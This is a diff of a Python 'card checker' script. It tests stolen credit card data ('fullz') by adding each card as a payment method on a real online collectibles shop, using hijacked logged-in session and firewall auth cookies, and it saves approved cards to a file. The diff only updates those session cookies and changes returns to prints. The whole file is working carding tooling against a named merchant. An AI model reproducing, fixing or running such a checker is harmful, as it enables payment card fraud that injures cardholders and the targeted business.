@@ -87,23 +87,26 @@ async def create_payment_method(fullz, session):
 
         # Cookies
         cookies = {
-            '_ga': 'GA1.1.333862603.1756374247',
-            '_gcl_au': '1.1.1881747356.1756374247',
-            'mailchimp_user_email': 'zerotracehacked%40gmail.com',
+            'mailchimp_landing_site': 'https%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F',
             'sbjs_migrations': '1418474375998%3D1',
-            'sbjs_first_add': 'fd%3D2025-08-31%2005%3A24%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2F%3Fsrsltid%3DAfmBOopYzTPOS7xH5nYM1WtqvxvNJJm-dp9XEOiXG7fHqYklIRiy7EgB%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'mailchimp_landing_site': 'https%3A%2F%2Fapluscollectibles.com%2F%3Fsrsltid%3DAfmBOoq8FJ6vCoYvJ09H23EDOT6KZUY9kpjaAgQiQSptUqge3sfo4zuV',
-            'sbjs_current_add': 'fd%3D2025-08-31%2007%3A15%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2F%3Fsrsltid%3DAfmBOoq8FJ6vCoYvJ09H23EDOT6KZUY9kpjaAgQiQSptUqge3sfo4zuV%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-            'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Safari%2F537.36',
+            'sbjs_current_add': 'fd%3D2025-08-28%2010%3A25%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-08-28%2010%3A25%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            '_gcl_au': '1.1.403858930.1756376751',
+            '_ga': 'GA1.1.1790710832.1756376751',
+            'mailchimp.cart.previous_email': 'zerotracehacked@gmail.com',
             'Subscribe': 'true',
-            'mailchimp.cart.current_email': 'zerotracehacked@gmail.com',
+            'wordpress_test_cookie': 'WP%20Cookie%20check',
+            'mailchimp.cart.current_email': 'senryjo@onionmail.org',
+            'mailchimp_user_previous_email': 'senryjo%40onionmail.org',
+            'mailchimp_user_email': 'senryjo%40onionmail.org',
+            'sbjs_udata': 'vst%3D8%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
             'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
-            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'zerotracehacked%7C1756799157%7CnD7FW8DApW206UkwUXq1XATEYHjrDHTxQZ63YEPncx2%7Ca2e5f8502ab08d7c15b7381d6ecac1c3d5c4e3dd10a025c27e5a4856fd28948d',
-            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '8961%7Cother%7Cread%7C314e7ddb46839835096721fc54c20706a06c35f06c4594bd9475cb8d74eef37f',
-            '_ga_D1Q49TMJ2C': 'GS2.1.s1756625842$o4$g1$t1756626377$j9$l0$h0',
-            'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'paraelsan%7C1756803031%7C1GOY820y1NTA6TO3zIoJdelvaLxEAGgDvbgxSV1AFtm%7C9146151b381c6a8f04ff59ce280d108091bf8ff7a1bf18defcb686432aec429a',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '8982%7Cother%7Cread%7C5327fb9d6bc311e9f14d7dce44ab91effe8e0db022a31df34c871672c1b1639b',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1756629760$o8$g1$t1756630324$j14$l0$h0',
+            'sbjs_session': 'pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
         }
 
         headers = {
@@ -210,7 +213,7 @@ async def create_payment_method(fullz, session):
 
         cookies_update = cookies.copy()
         cookies_update.update({
-            'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
+            'sbjs_session': 'pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
         })
 
         headers_update = {
@@ -254,14 +257,17 @@ async def create_payment_method(fullz, session):
     except Exception as e:
         return str(e)
 
+
 async def multi_checking(x):
     cc, mes, ano, cvv = x.split("|")
     if not is_valid_credit_card_number(cc):
-        return f"{x} - Credit card number is invalid"
+        print(f"{x} - Credit card number is invalid")
+        return
 
     valid, err = validate_expiry_date(mes, ano)
     if not valid:
-        return f"{x} - {err}"
+        print(f"{x} - {err}")
+        return
 
     start = time.time()
 
@@ -297,7 +303,7 @@ async def multi_checking(x):
             error_message = ""
 
     if "Reason: " in error_message:
-        _, _, after = error_message.partition("Reason: ")
+        before, sep, after = error_message.partition("Reason: ")
         error_message = after.strip()
 
     if "Payment method successfully added." in error_message:
@@ -307,13 +313,13 @@ async def multi_checking(x):
         response = "Approved"
 
     if error_message:
-        return f"{x} - {error_message} - Taken {elapsed}s"
+        print(f"{x} - {error_message}  - Taken {elapsed}s")
     else:
         resp = f"{x} - {response} - Taken {elapsed}s"
+        print(resp)
         if "Approved" in response:
             with open("auth.txt", "a", encoding="utf-8") as file:
                 file.write(resp + "\n")
-        return resp
 
 
 async def main():
@@ -325,8 +331,7 @@ async def main():
             if len(year) == 4:
                 year = year[-2:]
             new_cc = f"{cc_num}|{month}|{year}|{cvv}"
-            result = await multi_checking(new_cc)
-            print(result)
+            await multi_checking(new_cc)
             await asyncio.sleep(20)
 
 
